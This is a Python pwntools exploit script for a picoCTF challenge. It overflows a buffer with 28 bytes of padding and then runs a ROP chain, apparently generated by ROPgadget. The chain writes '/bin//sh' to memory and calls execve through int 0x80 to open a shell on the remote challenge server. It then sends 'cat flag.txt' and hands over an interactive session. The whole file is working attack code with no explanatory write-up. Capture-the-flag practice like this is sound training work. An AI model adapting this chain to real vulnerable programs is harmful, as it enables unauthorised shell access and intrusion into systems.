from pwn import *
from struct import pack
p=b'a'*28

#use ropgadget to automatically generate a ROP chain

# Padding goes here
p += pack('<I', 0x080583b9) # pop edx ; pop ebx ; ret
p += pack('<I', 0x080e5060) # @ .data
p += pack('<I', 0x41414141) # padding
p += pack('<I', 0x080b073a) # pop eax ; ret
p += b'/bin'
p += pack('<I', 0x080590f2) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x080583b9) # pop edx ; pop ebx ; ret
p += pack('<I', 0x080e5064) # @ .data + 4
p += pack('<I', 0x41414141) # padding
p += pack('<I', 0x080b073a) # pop eax ; ret
p += b'//sh'
p += pack('<I', 0x080590f2) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x080583b9) # pop edx ; pop ebx ; ret
p += pack('<I', 0x080e5068) # @ .data + 8
p += pack('<I', 0x41414141) # padding
p += pack('<I', 0x0804fb80) # xor eax, eax ; ret
p += pack('<I', 0x080590f2) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x08049022) # pop ebx ; ret
p += pack('<I', 0x080e5060) # @ .data
p += pack('<I', 0x08049e29) # pop ecx ; ret
p += pack('<I', 0x080e5068) # @ .data + 8
p += pack('<I', 0x080583b9) # pop edx ; pop ebx ; ret
p += pack('<I', 0x080e5068) # @ .data + 8
p += pack('<I', 0x080e5060) # padding without overwrite ebx
p += pack('<I', 0x0804fb80) # xor eax, eax ; ret
p += pack('<I', 0x0808054e) # inc eax ; ret
p += pack('<I', 0x0808054e) # inc eax ; ret
p += pack('<I', 0x0808054e) # inc eax ; ret
p += pack('<I', 0x0808054e) # inc eax ; ret
p += pack('<I', 0x0808054e) # inc eax ; ret
p += pack('<I', 0x0808054e) # inc eax ; ret
p += pack('<I', 0x0808054e) # inc eax ; ret
p += pack('<I', 0x0808054e) # inc eax ; ret
p += pack('<I', 0x0808054e) # inc eax ; ret
p += pack('<I', 0x0808054e) # inc eax ; ret
p += pack('<I', 0x0808054e) # inc eax ; ret
p += pack('<I', 0x0804a3c2) # int 0x80

sh = remote('saturn.picoctf.net',  53501)
print(sh.recv(1000))
sh.send(p)
sh.sendline(b'cat flag.txt')
sh.interactive()
sh.close()